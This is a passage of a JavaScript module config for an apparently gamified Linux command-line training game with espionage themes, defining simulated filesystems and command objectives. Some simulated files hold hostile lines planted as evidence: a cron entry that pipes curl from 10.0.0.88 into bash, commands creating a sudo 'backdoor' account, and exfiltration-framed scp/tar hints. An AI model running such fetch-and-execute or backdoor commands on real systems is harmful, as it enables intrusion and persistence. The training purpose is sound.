                '/var/dead-drops': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'courier',
                    children: ['drop_01', 'drop_02', 'drop_03']
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Incoming Packages', hint: '$ ls -la incoming/', check: (cmd) => cmd.includes('ls') && cmd.includes('incoming') },
                { id: 2, task: 'INSPECT: Archive Contents', hint: '$ tar -tzf incoming/package_alpha.tar.gz', check: (cmd) => cmd.includes('tar') && (cmd.includes('-t') || cmd.includes('--list')) },
                { id: 3, task: 'EXTRACT: Intel Package', hint: '$ tar -xzf incoming/package_alpha.tar.gz -C staging/', check: (cmd) => cmd.includes('tar') && (cmd.includes('-x') || cmd.includes('--extract')) },
                { id: 4, task: 'CREATE: Exfil Package', hint: '$ tar -czf outgoing/exfil.tar.gz staging/', check: (cmd) => cmd.includes('tar') && (cmd.includes('-c') || cmd.includes('--create')) },
                { id: 5, task: 'VERIFY: Package Integrity', hint: '$ gzip -t outgoing/exfil.tar.gz', check: (cmd) => (cmd.includes('gzip') && cmd.includes('-t')) || (cmd.includes('tar') && cmd.includes('-t')) || cmd.includes('md5sum') || cmd.includes('sha256sum') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-019: Disk Forensics
        // Theme: Evidence lab - analyzing disk images
        // ──────────────────────────────────────────────────────────
        'CLH-019': {
            title: 'Disk Forensics',
            description: 'Analyze disk images in the forensics lab to extract evidence.',
            prerequisites: ['CLH-018'],
            tier: 'CLI Specter',
            user: 'forensics',
            hostname: 'EVIDENCE-LAB',
            startDir: '/home/forensics',
            allowedCommands: null,

            filesystem: {
                '/home/forensics': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['cases', 'tools', 'reports', '.bashrc']
                },
                '/home/forensics/cases': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['case_2024_001', 'case_2024_002']
                },
                '/home/forensics/cases/case_2024_001': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['disk.img', 'memory.dmp', 'notes.txt']
                },
                '/home/forensics/cases/case_2024_001/disk.img': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 1073741824,
                    content: '[RAW DISK IMAGE - 1GB]'
                },
                '/home/forensics/cases/case_2024_001/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'forensics', group: 'forensics', size: 512,
                    content: 'CASE 2024-001: Compromised Workstation\n=====================================\nSuspect: Unknown threat actor\nEvidence: Full disk image acquired\nObjective: Recover deleted files and timeline\n'
                },
                '/home/forensics/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: ['recover.sh', 'timeline.py']
                },
                '/home/forensics/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'forensics', group: 'forensics',
                    children: []
                },
                '/mnt': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['evidence']
                },
                '/mnt/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'forensics',
                    children: ['home', 'var', 'tmp']
                },
            },

            objectives: [
                { id: 1, task: 'SURVEY: Available Disk Space', hint: '$ df -h', check: (cmd) => cmd.includes('df') },
                { id: 2, task: 'LIST: Block Devices', hint: '$ lsblk', check: (cmd) => cmd.includes('lsblk') },
                { id: 3, task: 'CHECK: Disk Usage', hint: '$ du -sh /mnt/evidence/*', check: (cmd) => cmd.includes('du') && cmd.includes('evidence') },
                { id: 4, task: 'FIND: Large Files', hint: '$ find /mnt/evidence -size +1M -type f', check: (cmd) => cmd.includes('find') && cmd.includes('-size') },
                { id: 5, task: 'SEARCH: Deleted Markers', hint: '$ grep -r "DELETED" /mnt/evidence/', check: (cmd) => cmd.includes('grep') && cmd.includes('evidence') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-020: User Reconnaissance
        // Theme: Profiling users on a compromised system
        // ──────────────────────────────────────────────────────────
        'CLH-020': {
            title: 'User Reconnaissance',
            description: 'Profile user accounts and privileges on a compromised system.',
            prerequisites: ['CLH-019'],
            tier: 'CLI Specter',
            user: 'auditor',
            hostname: 'BLACKSITE-7',
            startDir: '/home/auditor',
            allowedCommands: null,

            filesystem: {
                '/home/auditor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['audit_logs', 'reports', '.bashrc']
                },
                '/home/auditor/audit_logs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'auditor', group: 'auditor',
                    children: ['user_activity.log']
                },
                '/home/admin': {
                    type: 'dir', perms: 'drwx------', owner: 'admin', group: 'admin',
                    children: ['.ssh', 'scripts', '.bash_history']
                },
                '/home/admin/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 1024,
                    content: 'sudo useradd -m backdoor\nsudo passwd backdoor\nsudo usermod -aG sudo backdoor\n'
                },
                '/home/sysadmin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'sysadmin', group: 'sysadmin',
                    children: ['.ssh', 'maintenance']
                },
                '/home/backdoor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'backdoor', group: 'backdoor',
                    children: ['.bashrc', 'tools']
                },
            },

            objectives: [
                { id: 1, task: 'IDENTIFY: Current User', hint: '$ whoami && id', check: (cmd) => cmd.includes('whoami') || cmd.includes('id') },
                { id: 2, task: 'LIST: All Users', hint: '$ cat /etc/passwd', check: (cmd) => cmd.includes('cat') && cmd.includes('passwd') },
                { id: 3, task: 'FIND: Privileged Users', hint: '$ grep sudo /etc/group', check: (cmd) => cmd.includes('grep') && (cmd.includes('sudo') || cmd.includes('group')) },
                { id: 4, task: 'CHECK: Login History', hint: '$ last', check: (cmd) => cmd.includes('last') || cmd.includes('lastlog') },
                { id: 5, task: 'AUDIT: Sudoers', hint: '$ cat /etc/sudoers 2>/dev/null || sudo -l', check: (cmd) => cmd.includes('sudoers') || cmd.includes('sudo -l') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-021: SSH Operations
        // Theme: Secure tunnel establishment for exfiltration
        // ──────────────────────────────────────────────────────────
        'CLH-021': {
            title: 'SSH Operations',
            description: 'Establish encrypted tunnels for secure intel exfiltration.',
            prerequisites: ['CLH-020'],
            tier: 'CLI Specter',
            user: 'operator',
            hostname: 'SAFEHOUSE',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.ssh', 'mission_brief.txt', 'UMBRA_intercepts.tar.gz', '.bashrc']
                },
                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['known_hosts', 'config']
                },
                '/home/operator/.ssh/known_hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: 'relay.langley.gov ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...[VERIFIED]'
                },
                '/home/operator/.ssh/config': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 128,
                    content: 'Host relay\n    HostName relay.langley.gov\n    User handler\n    IdentityFile ~/.ssh/id_ed25519\n'
                },
                '/home/operator/mission_brief.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: 'OPERATION SILENT RELAY\n======================\nObjective: Exfiltrate UMBRA intercepts via SSH tunnel\nHandler: RAVEN-7 @ relay.langley.gov\nProtocol: Generate key, deploy, establish tunnel\n'
                },
                '/home/operator/UMBRA_intercepts.tar.gz': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 2516582,
                    content: '[TOP SECRET//UMBRA//NOFORN - Signal intercepts]'
                },
            },

            objectives: [
                { id: 1, task: 'GENERATE: SSH Key Pair', hint: '$ ssh-keygen -t ed25519', check: (cmd) => cmd.includes('ssh-keygen') },
                { id: 2, task: 'VERIFY: Key Created', hint: '$ ls -la ~/.ssh/', check: (cmd) => cmd.includes('ls') && cmd.includes('.ssh') },
                { id: 3, task: 'CHECK: SSH Config', hint: '$ cat ~/.ssh/config', check: (cmd) => cmd.includes('cat') && cmd.includes('config') },
                { id: 4, task: 'TEST: Connection', hint: '$ ssh -T relay (simulated)', check: (cmd) => cmd.includes('ssh') && !cmd.includes('keygen') },
                { id: 5, task: 'PREPARE: Secure Transfer', hint: '$ scp UMBRA_intercepts.tar.gz handler@relay:', check: (cmd) => cmd.includes('scp') || cmd.includes('rsync') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-022: Network Reconnaissance
        // Theme: Mapping network infrastructure
        // ──────────────────────────────────────────────────────────
        'CLH-022': {
            title: 'Network Reconnaissance',
            description: 'Map network infrastructure from a compromised outpost.',
            prerequisites: ['CLH-021'],
            tier: 'CLI Specter',
            user: 'recon',
            hostname: 'OUTPOST-7',
            startDir: '/home/recon',
            allowedCommands: null,

            filesystem: {
                '/home/recon': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['scans', 'notes', 'tools', '.bashrc']
                },
                '/home/recon/scans': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['initial_sweep.txt', 'port_scan.txt']
                },
                '/home/recon/scans/initial_sweep.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'recon', group: 'recon', size: 512,
                    content: 'NETWORK SWEEP RESULTS\n=====================\n192.168.1.0/24 - Corporate LAN\n10.0.0.0/8 - Internal Services\n172.16.0.0/16 - DMZ\n'
                },
                '/home/recon/notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['targets.txt']
                },
                '/home/recon/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'recon', group: 'recon',
                    children: ['scanner.sh']
                },
            },

            objectives: [
                { id: 1, task: 'CHECK: Network Interfaces', hint: '$ ip addr (or ifconfig)', check: (cmd) => cmd.includes('ip ') || cmd.includes('ifconfig') },
                { id: 2, task: 'VIEW: Routing Table', hint: '$ ip route (or netstat -rn)', check: (cmd) => cmd.includes('route') || cmd.includes('netstat') },
                { id: 3, task: 'SCAN: Open Ports', hint: '$ ss -tuln (or netstat -tuln)', check: (cmd) => cmd.includes('ss ') || (cmd.includes('netstat') && cmd.includes('-')) },
                { id: 4, task: 'CHECK: DNS Config', hint: '$ cat /etc/resolv.conf', check: (cmd) => cmd.includes('resolv') },
                { id: 5, task: 'TEST: Connectivity', hint: '$ ping -c 3 192.168.1.1', check: (cmd) => cmd.includes('ping') || cmd.includes('traceroute') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-023: Service Management
        // Theme: Analyzing services on compromised server
        // ──────────────────────────────────────────────────────────
        'CLH-023': {
            title: 'Service Management',
            description: 'Analyze running services on a compromised server.',
            prerequisites: ['CLH-022'],
            tier: 'CLI Wraith',
            user: 'analyst',
            hostname: 'COMPROMISED-SRV',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['analysis', 'reports', '.bashrc']
                },
                '/home/analyst/analysis': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['services.txt', 'suspicious.txt']
                },
                '/home/analyst/analysis/suspicious.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 256,
                    content: 'SUSPICIOUS SERVICES\n===================\nxmrig - Cryptominer\nreverse_shell.service - Backdoor\nbeacon.timer - C2 heartbeat\n'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Running Services', hint: '$ systemctl list-units --type=service', check: (cmd) => cmd.includes('systemctl') && cmd.includes('list') },
                { id: 2, task: 'CHECK: Service Status', hint: '$ systemctl status sshd', check: (cmd) => cmd.includes('systemctl') && cmd.includes('status') },
                { id: 3, task: 'VIEW: Service Config', hint: '$ systemctl cat sshd', check: (cmd) => cmd.includes('systemctl') && cmd.includes('cat') },
                { id: 4, task: 'FIND: Failed Services', hint: '$ systemctl --failed', check: (cmd) => cmd.includes('systemctl') && cmd.includes('failed') },
                { id: 5, task: 'LIST: Enabled Services', hint: '$ systemctl list-unit-files --state=enabled', check: (cmd) => cmd.includes('systemctl') && cmd.includes('enabled') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-024: Scheduled Tasks (Cron)
        // Theme: Finding persistence mechanisms
        // ──────────────────────────────────────────────────────────
        'CLH-024': {
            title: 'Scheduled Tasks',
            description: 'Hunt for malicious cron jobs and persistence mechanisms.',
            prerequisites: ['CLH-023'],
            tier: 'CLI Wraith',
            user: 'operator',
            hostname: 'BEACON-NODE',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.bashrc', 'analysis']
                },
                '/var/spool/cron/crontabs': {
                    type: 'dir', perms: 'drwx-wx--T', owner: 'root', group: 'crontab',
                    children: ['root', 'operator']
                },
                '/var/spool/cron/crontabs/root': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'crontab', size: 256,
                    content: '# Suspicious entries\n*/5 * * * * /tmp/.hidden/beacon.sh\n0 * * * * curl http://10.0.0.88/update | bash\n'
                },
                '/etc/cron.d': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['e2scrub_all', 'popularity-contest', 'backdoor']
                },
                '/etc/cron.d/backdoor': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
                    content: '# MALICIOUS\n*/10 * * * * root /opt/.malware/persist.sh\n'
                },
                '/etc/crontab': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512,
                    content: 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n25 6 * * * root test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: User Crontab', hint: '$ crontab -l', check: (cmd) => cmd.includes('crontab') && cmd.includes('-l') },
                { id: 2, task: 'CHECK: System Crontab', hint: '$ cat /etc/crontab', check: (cmd) => cmd.includes('cat') && cmd.includes('crontab') },
                { id: 3, task: 'SEARCH: Cron Directories', hint: '$ ls -la /etc/cron.d/', check: (cmd) => cmd.includes('ls') && cmd.includes('cron') },
                { id: 4, task: 'FIND: All Cron Jobs', hint: '$ find /etc/cron* -type f', check: (cmd) => cmd.includes('find') && cmd.includes('cron') },
                { id: 5, task: 'ANALYZE: Suspicious Entry', hint: '$ cat /etc/cron.d/backdoor', check: (cmd) => cmd.includes('cat') && cmd.includes('backdoor') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-025: Package Management
        // Theme: Forensic analysis of installed packages
        // ──────────────────────────────────────────────────────────
        'CLH-025': {
            title: 'Package Management',
            description: 'Analyze installed packages for unauthorized software.',
            prerequisites: ['CLH-024'],
            tier: 'CLI Wraith',
            user: 'analyst',
            hostname: 'FORENSIC-WS',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['package_audit', 'reports', '.bashrc']
                },
                '/home/analyst/package_audit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['baseline.txt', 'current.txt', 'diff.txt']
                },
                '/home/analyst/package_audit/baseline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: 'Known good package list from clean install...'
                },
            },

            objectives: [
                { id: 1, task: 'LIST: Installed Packages', hint: '$ dpkg -l (or apt list --installed)', check: (cmd) => cmd.includes('dpkg') || (cmd.includes('apt') && cmd.includes('list')) },
                { id: 2, task: 'SEARCH: Specific Package', hint: '$ dpkg -l | grep ssh', check: (cmd) => cmd.includes('dpkg') && cmd.includes('grep') },
                { id: 3, task: 'CHECK: Package Info', hint: '$ dpkg -s openssh-server', check: (cmd) => cmd.includes('dpkg') && cmd.includes('-s') },
                { id: 4, task: 'FIND: Recently Installed', hint: '$ grep " install " /var/log/dpkg.log', check: (cmd) => cmd.includes('grep') && cmd.includes('dpkg.log') },
                { id: 5, task: 'VERIFY: Package Files', hint: '$ dpkg -V openssh-server', check: (cmd) => cmd.includes('dpkg') && cmd.includes('-V') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-026: Access Control
        // Theme: Privilege escalation analysis
        // ──────────────────────────────────────────────────────────
        'CLH-026': {
            title: 'Access Control',
            description: 'Analyze access controls and find privilege escalation paths.',
            prerequisites: ['CLH-025'],
            tier: 'CLI Wraith',
            user: 'infiltrator',
            hostname: 'EMBASSY-SRV',
            startDir: '/home/infiltrator',
            allowedCommands: null,

            filesystem: {
                '/home/infiltrator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['privesc_notes', '.bashrc']
                },
                '/home/infiltrator/privesc_notes': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
                    children: ['suid_binaries.txt', 'sudo_rules.txt', 'weak_perms.txt']
                },
                '/home/infiltrator/privesc_notes/suid_binaries.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
                    content: 'SUID BINARIES OF INTEREST\n=========================\n/usr/bin/find - GTFOBins exploit available\n/usr/bin/vim - Can spawn shell\n/opt/custom/backup - Custom binary, investigate\n'
                },
            },

            objectives: [
                { id: 1, task: 'CHECK: Current Permissions', hint: '$ id && groups', check: (cmd) => cmd.includes('id') || cmd.includes('groups') },
                { id: 2, task: 'FIND: SUID Binaries', hint: '$ find / -perm -4000 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') },
                { id: 3, task: 'CHECK: Sudo Permissions', hint: '$ sudo -l', check: (cmd) => cmd.includes('sudo') && cmd.includes('-l') },
                { id: 4, task: 'FIND: World-Writable', hint: '$ find / -perm -o+w -type f 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('w') },
                { id: 5, task: 'CHECK: Capabilities', hint: '$ getcap -r / 2>/dev/null', check: (cmd) => cmd.includes('getcap') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-027: User Management
        // Theme: Managing user accounts post-compromise
        // ──────────────────────────────────────────────────────────
        'CLH-027': {
            title: 'User Management',
            description: 'Understand user management commands for persistence and cleanup.',
            prerequisites: ['CLH-026'],
            tier: 'CLI Wraith',
            user: 'admin',
            hostname: 'ADMIN-SRV',
            startDir: '/home/admin',
            allowedCommands: null,

            filesystem: {
                '/home/admin': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['user_audit', 'scripts', '.bashrc']
                },
                '/home/admin/user_audit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['user_list.txt', 'group_memberships.txt']
                },
                '/home/admin/user_audit/user_list.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 256,
                    content: 'SYSTEM USERS\n============\nroot - System administrator\nadmin - Local admin\nbackdoor - SUSPICIOUS (created yesterday)\nguest - Disabled account\n'
                },
                '/home/admin/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['add_user.sh', 'audit_users.sh']
                },
            },

            objectives: [
                { id: 1, task: 'LIST: User Accounts', hint: '$ cat /etc/passwd | cut -d: -f1', check: (cmd) => cmd.includes('passwd') },
                { id: 2, task: 'CHECK: User Details', hint: '$ getent passwd admin', check: (cmd) => cmd.includes('getent') || cmd.includes('finger') },
                { id: 3, task: 'LIST: Group Memberships', hint: '$ groups admin (or cat /etc/group)', check: (cmd) => cmd.includes('groups') || (cmd.includes('cat') && cmd.includes('group')) },
                { id: 4, task: 'CHECK: Password Status', hint: '$ passwd -S admin (or chage -l)', check: (cmd) => cmd.includes('passwd') && cmd.includes('-S') || cmd.includes('chage') },
                { id: 5, task: 'AUDIT: Login Shells', hint: '$ cat /etc/shells && grep -v nologin /etc/passwd', check: (cmd) => cmd.includes('shells') || cmd.includes('nologin') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-028: System Monitoring
        // Theme: Real-time system analysis
        // ──────────────────────────────────────────────────────────
        'CLH-028': {
            title: 'System Monitoring',
            description: 'Monitor system resources and detect anomalies.',
            prerequisites: ['CLH-027'],
            tier: 'CLI Ghost',
            user: 'monitor',
            hostname: 'OPS-CENTER',
            startDir: '/home/monitor',
            allowedCommands: null,

            filesystem: {
                '/home/monitor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['dashboards', 'alerts', '.bashrc']
                },
                '/home/monitor/dashboards': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['cpu_history.log', 'memory_history.log']
                },
                '/home/monitor/alerts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['high_cpu.txt', 'suspicious_proc.txt']
                },
                '/home/monitor/alerts/suspicious_proc.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 256,
                    content: 'SUSPICIOUS PROCESSES DETECTED\n==============================\nPID 6666 - xmrig (cryptominer) - 95% CPU\nPID 7777 - nc (netcat) - Persistent connection to 10.0.0.88\nPID 8888 - /tmp/.hidden/backdoor\n'
                },
            },

            objectives: [
                { id: 1, task: 'VIEW: Process List', hint: '$ ps aux', check: (cmd) => cmd.includes('ps') },
                { id: 2, task: 'MONITOR: Real-time', hint: '$ top (or htop)', check: (cmd) => cmd.includes('top') },
                { id: 3, task: 'CHECK: Memory Usage', hint: '$ free -h', check: (cmd) => cmd.includes('free') },
                { id: 4, task: 'VIEW: Disk I/O', hint: '$ iostat (or vmstat)', check: (cmd) => cmd.includes('iostat') || cmd.includes('vmstat') || cmd.includes('iotop') },
                { id: 5, task: 'FIND: High CPU Process', hint: '$ ps aux --sort=-%cpu | head', check: (cmd) => cmd.includes('ps') && (cmd.includes('sort') || cmd.includes('cpu')) },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-029: Vim Essentials
        // Theme: Essential editor skills for field operations
        // ──────────────────────────────────────────────────────────
        'CLH-029': {
            title: 'Vim Essentials',
            description: 'Master the essential text editor for field operations.',
            prerequisites: ['CLH-028'],
            tier: 'CLI Ghost',
            user: 'operator',
            hostname: 'FIELD-OPS',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['training', 'configs', '.vimrc', '.bashrc']
                },
                '/home/operator/training': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['practice.txt', 'mission_template.txt']
                },
                '/home/operator/training/practice.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: 'VIM PRACTICE FILE\n=================\nLine 1: The quick brown fox\nLine 2: jumps over the lazy dog\nLine 3: Pack my box with five dozen\nLine 4: liquor jugs\nLine 5: How vexingly quick daft zebras jump\n'
                },
                '/home/operator/.vimrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: '" Operator .vimrc\nset number\nset syntax=on\nset tabstop=4\nset autoindent\n'
                },
                '/home/operator/configs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['network.conf', 'services.conf']
                },
            },

            objectives: [
                { id: 1, task: 'OPEN: Practice File', hint: '$ vim training/practice.txt', check: (cmd) => cmd.includes('vim') || cmd.includes('vi') },
                { id: 2, task: 'READ: Vim Config', hint: '$ cat ~/.vimrc', check: (cmd) => cmd.includes('vimrc') },
                { id: 3, task: 'LEARN: Vim Help', hint: '$ vim (then :help in vim)', check: (cmd) => cmd.includes('vim') },
                { id: 4, task: 'EDIT: Config File', hint: '$ vim configs/network.conf', check: (cmd) => cmd.includes('vim') && cmd.includes('conf') },
                { id: 5, task: 'PRACTICE: Navigation', hint: 'Open any file with vim', check: (cmd) => cmd.includes('vim') || cmd.includes('vi') },
            ],

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-030: OPERATION CHIMERA (Capstone)
        // Theme: Final comprehensive mission
        // ──────────────────────────────────────────────────────────
        'CLH-030': {
            title: 'OPERATION CHIMERA',
            description: 'Final capstone mission. Apply all skills to compromise and exfiltrate from a high-value target.',
            prerequisites: ['CLH-029'],
            tier: 'CLI Ghost',
            user: 'ghost',
            hostname: 'CHIMERA',
            startDir: '/home/ghost',
            allowedCommands: null,

            filesystem: {
                '/home/ghost': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['mission', 'tools', 'staging', '.bashrc', '.ssh']
                },
                '/home/ghost/mission': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['briefing.txt', 'objectives.txt', 'contacts.txt']
                },
                '/home/ghost/mission/briefing.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1024,
                    content: `OPERATION CHIMERA
=================
Classification: TOP SECRET//NOFORN

SITUATION:
You have gained initial access to CHIMERA network.
Multiple high-value targets identified.

MISSION:
1. Establish persistence
2. Escalate privileges
3. Locate classified data
4. Exfiltrate to handler

TIME LIMIT: Mission critical
HANDLER: SPECTER-1

"Leave no trace. Trust no one."
`
                },
                '/home/ghost/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['scanner.sh', 'privesc.py', 'exfil.sh']
                },
                '/home/ghost/staging': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: []
                },
                '/home/ghost/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: ['id_ed25519', 'id_ed25519.pub', 'known_hosts']
                },
                '/data/classified': {
                    type: 'dir', perms: 'drwx------', owner: 'root', group: 'classified',
                    children: ['project_chimera.pdf', 'asset_network.xlsx', 'operational_plans.docx']
                },
                '/data/classified/project_chimera.pdf': {
                    type: 'file', perms: '-rw-------', owner: 'root', group: 'classified', size: 5242880,
                    content: '[TOP SECRET//CHIMERA//NOFORN - Project documentation]'
                },
                '/var/log': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['auth.log', 'syslog', 'secure']
                },
                '/var/log/auth.log': {
                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096,
                    content: 'Jan 18 03:00:00 CHIMERA sshd[1234]: Accepted key for ghost from 10.0.0.1\nJan 18 03:00:15 CHIMERA sudo: ghost : TTY=pts/0 ; PWD=/home/ghost ; USER=root ; COMMAND=/bin/cat /etc/shadow\n'
                },
            },

            objectives: [
                { id: 1, task: 'RECON: Survey Environment', hint: 'ls -la && pwd && whoami', check: (cmd) => cmd.includes('ls') || cmd.includes('pwd') || cmd.includes('whoami') },
                { id: 2, task: 'INTEL: Read Mission Briefing', hint: '$ cat mission/briefing.txt', check: (cmd) => cmd.includes('cat') && cmd.includes('briefing') },
                { id: 3, task: 'ESCALATE: Find Privilege Path', hint: '$ find / -perm -4000 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') },
                { id: 4, task: 'LOCATE: Classified Data', hint: '$ find /data -name "*.pdf" 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('data') },
                { id: 5, task: 'EXFIL: Package Intel', hint: '$ tar -czf staging/chimera_intel.tar.gz /data/classified/', check: (cmd) => cmd.includes('tar') && cmd.includes('staging') },
            ],

            remoteHosts: null,
        },

    };

    // ═══════════════════════════════════════════════════════════════
    // PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    /**
     * Get a module configuration by ID
     * @param {string} moduleId - The module ID (e.g., 'CLH-002')
     * @returns {object|null} Module configuration or null if not found
     */
    function getModule(moduleId) {
        return MODULES[moduleId] || null;
    }

    /**
     * Get all module IDs
     * @returns {string[]} Array of module IDs
     */
    function getAllModuleIds() {
        return Object.keys(MODULES);
    }

    /**
     * Get modules by tier
     * @param {string} tierName - Tier name (e.g., 'CLI Recruit')
     * @returns {string[]} Array of module IDs in that tier
     */
    function getModulesByTier(tierName) {
        const tier = TIERS[tierName];
        return tier ? tier.modules : [];
    }

    /**
     * Get tier information
     * @param {string} tierName - Tier name
     * @returns {object|null} Tier info or null
     */
    function getTier(tierName) {
        return TIERS[tierName] || null;
    }

    /**
     * Get all tier names in order
     * @returns {string[]} Array of tier names
     */
    function getAllTiers() {
        return Object.keys(TIERS);
    }

    /**
     * Check if a module ID is valid
     * @param {string} moduleId - Module ID to check
     * @returns {boolean}
     */
    function isValidModule(moduleId) {
        return moduleId in MODULES;
    }

    /**
     * Get the next module after the given one
     * @param {string} moduleId - Current module ID
     * @returns {string|null} Next module ID or null if last
     */
    function getNextModule(moduleId) {
